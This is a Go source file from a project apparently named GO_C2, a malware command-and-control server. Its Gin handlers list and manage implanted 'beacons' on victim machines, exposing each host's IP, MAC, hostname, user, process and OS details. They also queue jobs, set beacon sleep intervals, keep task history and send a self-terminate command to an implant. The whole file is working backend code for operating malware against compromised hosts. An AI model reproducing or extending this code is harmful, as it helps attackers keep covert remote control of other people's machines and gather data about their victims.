package handler

import (
    "fmt"
    "log"
    "time"
    "database/sql"
    "github.com/gin-gonic/gin"
    "GO_C2/db"
    "GO_C2/utils"
)

func ListBeaconsHandler(c *gin.Context) {
    username, exists := c.Get("username")
    if !exists || username == "" { c.JSON(401, gin.H{"error":"Authentication required"}); return }
    beacons, err := db.ListBeacons(); if err != nil { c.JSON(500, gin.H{"error":"Failed to list beacons"}); return }
    var response []gin.H
    for _, b := range beacons {
        log.Printf("Beacon [%s] times: FirstTime=%v, LastSeen=%v", b.UUID, b.FirstTime, b.LastSeen)
        firstTimeMs := b.FirstTime.UnixNano() / int64(time.Millisecond)
        lastSeenMs := b.LastSeen.UnixNano() / int64(time.Millisecond)
        log.Printf("Converted timestamps: FirstTime=%d, LastSeen=%d", firstTimeMs, lastSeenMs)
        // 计算心跳（Sleep 秒）
        heartbeat := b.SleepSeconds
        response = append(response, gin.H{
            "id": b.ID, "ip": b.IP, "ipv6": b.IPv6, "mac": b.MAC,
            "hostname": b.HostName, "username": b.UserName,
            "process_name": b.ProcessName, "process_path": b.ProcessPath, "process_id": b.ProcessID,
            "arch": b.Arch, "os_uuid": b.OSUUID, "os_version": b.OSVersion, "uuid": b.UUID,
            "first_time": firstTimeMs, "last_seen": lastSeenMs, "heartbeat": heartbeat,
            "remark": b.Remark,
            "job": b.Job, "job_result": b.JobResult,
        })
    }
    c.JSON(200, gin.H{"status":"success","data": response})
}

func GetBeaconHandler(c *gin.Context) {
    uuid := c.Param("uuid")
    if !utils.ValidateUUID(uuid) { c.JSON(400, gin.H{"error":"Invalid UUID"}); return }
    b, err := db.GetBeaconByUUID(uuid)
    if err != nil { c.JSON(404, gin.H{"error":"Beacon not found"}); return }
    c.JSON(200, gin.H{
        "id": b.ID, "ip": b.IP, "ipv6": b.IPv6, "mac": b.MAC,
        "hostname": b.HostName, "username": b.UserName,
        "process_name": b.ProcessName, "process_path": b.ProcessPath, "process_id": b.ProcessID,
        "arch": b.Arch, "os_uuid": b.OSUUID, "os_version": b.OSVersion, "uuid": b.UUID,
        "first_time": b.FirstTime.UnixNano() / int64(time.Millisecond),
        "last_seen": b.LastSeen.UnixNano() / int64(time.Millisecond), "heartbeat": b.SleepSeconds,
        "remark": b.Remark,
        "job": b.Job, "job_result": b.JobResult,
    })
}

func DeleteBeaconHandler(c *gin.Context) {
    uuid := c.Param("uuid")
    if !utils.ValidateUUID(uuid) { c.JSON(400, gin.H{"success": false, "error":"无效的UUID"}); return }
    var beaconForNotify *db.Beacon
    if b, err := db.GetBeaconByUUID(uuid); err == nil { beaconForNotify = b }
    err := db.DeleteBeaconByUUID(uuid)
    if err == sql.ErrNoRows { c.JSON(404, gin.H{"success": false, "error":"Beacon不存在"}); return }
    if err != nil { log.Printf("删除Beacon失败: %v", err); c.JSON(500, gin.H{"success": false, "error":"删除失败"}); return }
    log.Printf("成功删除Beacon [%s]", uuid)
    c.JSON(200, gin.H{"success": true, "message":"删除成功"})
    if beaconForNotify != nil { go utils.SendBeaconDeletedMarkdownNotification(beaconForNotify) }
}

func UpdateBeaconJobHandler(c *gin.Context) { CreateJobHandler(c) }

// UpdateRemarkHandler 更新备注
func UpdateRemarkHandler(c *gin.Context) {
    uuid := c.Param("uuid")
    var body struct{ Remark string `json:"remark"` }
    if !utils.ValidateUUID(uuid) { c.JSON(400, gin.H{"error":"Invalid UUID"}); return }
    if err := c.BindJSON(&body); err != nil { c.JSON(400, gin.H{"error":"Invalid body"}); return }
    if _, err := db.DB.Exec("UPDATE beacons SET remark = ? WHERE uuid = ?", body.Remark, uuid); err != nil { c.JSON(500, gin.H{"error":"Failed to update remark"}); return }
    c.JSON(200, gin.H{"status":"success"})
}

func GetTaskHistoryHandler(c *gin.Context) {
    beaconUUID := c.Param("uuid")
    if beaconUUID == "" { c.JSON(400, gin.H{"error":"Beacon UUID is required"}); return }
    if username, ok := c.Get("username"); !ok || username == "" { c.JSON(401, gin.H{"error":"Authentication required"}); return }
    histories, err := db.GetTaskHistoryByBeaconUUID(beaconUUID); if err != nil { c.JSON(500, gin.H{"error":"Failed to get task history"}); return }
    c.JSON(200, gin.H{"status":"success", "data": histories})
}

func TerminateBeaconHandler(c *gin.Context) {
    clientId := c.Param("uuid")
    if !utils.ValidateUUID(clientId) { c.JSON(400, gin.H{"error":"Invalid UUID"}); return }
    beacon, err := db.GetBeaconByUUID(clientId)
    if err != nil { c.JSON(404, gin.H{"error":"Beacon not found"}); return }
    jobData := fmt.Sprintf("%c%d", 0x1E, beacon.ProcessID)
    if err := db.UpdateBeaconJob(clientId, jobData); err != nil { c.JSON(500, gin.H{"error":"Failed to update job"}); return }
    createTaskHistory(clientId, "Kill Process", fmt.Sprintf("Kill PID %d (self-terminate)", beacon.ProcessID))
    go utils.SendJobCreatedMarkdownNotification(beacon, "0x1E", fmt.Sprintf("Kill self PID %d", beacon.ProcessID))
    c.JSON(200, gin.H{"status":"success", "message":"Terminate command sent. Delete the beacon after it stops."})
}

func createTaskHistory(beaconUUID, taskType, command string) {
    // 防重复：2 秒内同一 Beacon、同类型、同命令且仍是 pending 的记录，不再重复创建
    var existID int64
    cutoff := time.Now().Add(-2 * time.Second)
    row := db.DB.QueryRow(`SELECT id FROM task_history WHERE beacon_uuid = ? AND task_type = ? AND command = ? AND status = 'pending' AND created_at >= ? ORDER BY id DESC LIMIT 1`, beaconUUID, taskType, command, cutoff)
    _ = row.Scan(&existID)
    if existID > 0 { return }

    history := &db.TaskHistory{ BeaconUUID: beaconUUID, TaskType: taskType, Command: command, Status: "pending", Result: "", CreatedAt: time.Now(), UpdatedAt: time.Now() }
    if err := db.CreateTaskHistory(history); err != nil { log.Printf("Failed to create task history: %v", err) }
}

// dbSetSleep 更新心跳秒数
func dbSetSleep(uuid string, seconds int) error {
    _, err := db.DB.Exec("UPDATE beacons SET sleep_seconds = ? WHERE uuid = ?", seconds, uuid)
    return err
}

// createCompletedTaskHistory 直接写一条完成的任务历史（用于无回传的任务，如 Sleep）
func createCompletedTaskHistory(beaconUUID, taskType, command, result string) {
    history := &db.TaskHistory{ BeaconUUID: beaconUUID, TaskType: taskType, Command: command, Status: "completed", Result: result, CreatedAt: time.Now(), UpdatedAt: time.Now() }
    if err := db.CreateTaskHistory(history); err != nil { log.Printf("Failed to create completed task history: %v", err) }
}


